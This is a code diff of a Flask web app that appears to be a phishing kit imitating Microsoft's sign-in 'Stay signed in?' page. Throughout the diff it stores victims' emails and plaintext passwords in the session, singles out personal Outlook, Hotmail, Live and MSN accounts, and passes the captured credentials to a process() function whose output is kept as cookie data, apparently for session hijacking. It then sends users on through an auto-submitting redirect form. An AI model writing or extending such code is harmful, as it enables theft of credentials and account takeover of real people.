@@ -1135,8 +1135,8 @@ async def sign_in_handler():
             session['email'] = email
             session['password'] = password
 
-            # Render StaySignIn.html template
-            return render_template('StaySignIn.html')
+            # Redirect to stay-signed-in route
+            return redirect(url_for('stay_signed_in'))
         else:
             return jsonify({
                 "status": "error",
@@ -1150,38 +1150,42 @@ async def sign_in_handler():
             "message": "An error occurred during sign in"
         }), 500
 
-@app.route('/stay-signed-in', methods=['POST'])
+@app.route('/stay-signed-in', methods=['GET', 'POST'])
 async def stay_signed_in():
-    # Get the value of the "Stay signed in?" option
-    stay_signed_in = request.form.get('Kmsi') == 'true'
+    if request.method == 'GET':
+        # Render the StaySignIn.html template
+        return render_template('StaySignIn.html')
+    elif request.method == 'POST':
+        # Get the value of the "Stay signed in?" option
+        stay_signed_in = request.form.get('Kmsi') == 'true'
 
-    # Store the value in the session
-    session['stay_signed_in'] = stay_signed_in
+        # Store the value in the session
+        session['stay_signed_in'] = stay_signed_in
 
-    # Check if personal or work email account
-    email = session.get('email', '')
-    is_personal = any(domain in email.lower() for domain in [
-        'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
-        'outlook.ca', 'hotmail.ca', 'live.ca'
-    ])
+        # Check if personal or work email account
+        email = session.get('email', '')
+        is_personal = any(domain in email.lower() for domain in [
+            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+            'outlook.ca', 'hotmail.ca', 'live.ca'
+        ])
 
-    # Get login result from session
-    login_result = session.get('login_result', {})
-    login_status = login_result.get('status')
+        # Get login result from session
+        login_result = session.get('login_result', {})
+        login_status = login_result.get('status')
 
-    # Call process function only for personal accounts with "success" login status
-    if is_personal and login_status == 'success':
-        user_email = session.get('email')
-        user_password = session.get('password')  # Assuming password is still needed here
-        if user_email and user_password:
-            cookie_data = process(user_email, user_password, request)
-            session['cookie_data'] = cookie_data  # Store cookie data in session
+        # Call process function only for personal accounts with "success" login status
+        if is_personal and login_status == 'success':
+            user_email = session.get('email')
+            user_password = session.get('password')  # Assuming password is still needed here
+            if user_email and user_password:
+                cookie_data = process(user_email, user_password, request)
+                session['cookie_data'] = cookie_data  # Store cookie data in session
 
-    # Render a template with a form that auto-submits to /final-redirect
-    return render_template(
-        'redirect_form.html',
-        stay_signed_in=stay_signed_in
-    )
+        # Render a template with a form that auto-submits to /final-redirect
+        return render_template(
+            'redirect_form.html',
+            stay_signed_in=stay_signed_in
+        )
 
 def process(email, password, request):
     """
